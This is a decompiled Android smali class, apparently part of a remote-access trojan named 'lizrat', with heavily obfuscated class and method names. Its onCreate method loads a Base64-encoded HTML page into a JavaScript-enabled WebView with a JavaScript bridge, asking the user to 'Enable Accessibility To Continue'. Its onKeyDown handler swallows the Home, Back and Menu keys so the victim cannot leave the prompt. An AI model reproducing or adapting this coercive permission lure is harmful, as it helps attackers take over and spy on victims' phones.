.class public LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;
.super Landroid/app/Activity;
.source "sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16.java"


# annotations
.annotation system Ldalvik/annotation/MemberClasses;
    value = {
        LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;,
        LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebViewClient;,
        LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebChromeClient;
    }
.end annotation


# instance fields
.field public localeForAccessibility:Ljava/lang/String;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 19
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const-string v0, "{\'en\':\'Enable\',\'de\':\'Aktivieren\',\'ar\':\'\u062a\u0641\u0639\u064a\u0644"

    .line 20
    iput-object v0, p0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->localeForAccessibility:Ljava/lang/String;

    return-void
.end method


# virtual methods
.method public finish()V
    .locals 2

    .line 23
    sget v0, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v1, 0x15

    if-lt v0, v1, :cond_0

    .line 24
    invoke-virtual {p0}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->finishAndRemoveTask()V

    return-void

    .line 27
    :cond_0
    invoke-super {p0}, Landroid/app/Activity;->finish()V

    return-void
.end method

.method public localeTextAccessibility()Ljava/lang/String;
    .locals 2

    .line 32
    :try_start_0
    new-instance v0, Lorg/json/JSONObject;

    iget-object v1, p0, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->localeForAccessibility:Ljava/lang/String;

    invoke-direct {v0, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v1

    invoke-virtual {v1}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    const-string v0, "Enable"

    return-object v0
.end method

.method public onBackPressed()V
    .locals 0

    .line 39
    invoke-super {p0}, Landroid/app/Activity;->onBackPressed()V

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 7

    const-string v0, "\'"

    .line 43
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    .line 45
    :try_start_0
    new-instance p1, Landroid/webkit/WebView;

    invoke-direct {p1, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V

    .line 46
    invoke-virtual {p1}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v1

    const/4 v2, 0x1

    invoke-virtual {v1, v2}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    const/4 v1, 0x0

    .line 47
    invoke-virtual {p1, v1}, Landroid/webkit/WebView;->setScrollBarStyle(I)V

    .line 48
    new-instance v2, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebViewClient;

    const/4 v3, 0x0

    invoke-direct {v2, p0, v3}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebViewClient;-><init>(LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$1;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    .line 49
    new-instance v2, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebChromeClient;

    invoke-direct {v2, p0, v3}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$MyWebChromeClient;-><init>(LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$1;)V

    invoke-virtual {p1, v2}, Landroid/webkit/WebView;->setWebChromeClient(Landroid/webkit/WebChromeClient;)V

    .line 50
    new-instance v2, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;

    invoke-direct {v2, p0, p0}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16$WebAppInterface;-><init>(LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;Landroid/content/Context;)V

    const-string v3, "Android"

    invoke-virtual {p1, v2, v3}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    const/high16 v2, 0x7f070000

    .line 51
    invoke-virtual {p0, v2}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->getString(I)Ljava/lang/String;

    move-result-object v2

    .line 52
    invoke-static {p0}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->getLabelApplication(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v3

    .line 53
    new-instance v4, Ljava/lang/String;

    invoke-static {v2, v1}, Landroid/util/Base64;->decode(Ljava/lang/String;I)[B

    move-result-object v1

    const-string v2, "UTF-8"

    invoke-direct {v4, v1, v2}, Ljava/lang/String;-><init>([BLjava/lang/String;)V

    const-string v1, "Start Accessibility"

    invoke-virtual {v4, v1, v3}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 54
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    .line 55
    invoke-virtual {p0}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->localeTextAccessibility()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " : \'"

    .line 56
    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 57
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 58
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "Enable Accessibility To Continue"

    .line 59
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v3, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v1

    .line 60
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "var lang = \'"

    .line 61
    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 62
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 63
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v0, "var lang = \'en\'"

    .line 64
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v0, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "PGh0bWwgbGFuZz0iZW4iPg=="

    .line 65
    invoke-static {v1}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 66
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "PGh0bWwgbGFuZz0i"

    .line 67
    invoke-static {v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    .line 68
    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "Ij4="

    .line 69
    invoke-static {v3}, LLiz0rd/lizrat/aspectybirthdayocommodityxsafevtakingldefinitelybsubscribeoneedlesthyolaptoplstagesdautowmaxk5;->cingulartdefendantdindependentlyiwithoutfcalculatexilfappreciatevlcdiheroesocherrykliteraryc40(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const/4 v3, 0x0

    .line 70
    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    const-string v4, "text/html"

    const-string v5, "UTF-8"

    const/4 v6, 0x0

    move-object v1, p1

    move-object v2, v3

    move-object v3, v0

    invoke-virtual/range {v1 .. v6}, Landroid/webkit/WebView;->loadDataWithBaseURL(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    .line 71
    invoke-virtual {p0, p1}, LLiz0rd/lizrat/sneribboneaimqdiscriminationbcatalogxwillingkfavoritekdisappointedznightsysolidgdesignsrdecadesj16;->setContentView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    return-void
.end method

.method public onDestroy()V
    .locals 0

    .line 79
    invoke-super {p0}, Landroid/app/Activity;->onDestroy()V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 1

    const/4 p2, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    goto :goto_0

    :cond_0
    const/4 v0, 0x4

    if-ne p1, v0, :cond_1

    goto :goto_0

    :cond_1
    const/16 v0, 0x52

    if-ne p1, v0, :cond_2

    goto :goto_0

    :cond_2
    const/4 p2, 0x0

    :goto_0
    return p2
.end method

.method protected onStop()V
    .locals 0

    .line 87
    invoke-super {p0}, Landroid/app/Activity;->onStop()V

    return-void
.end method
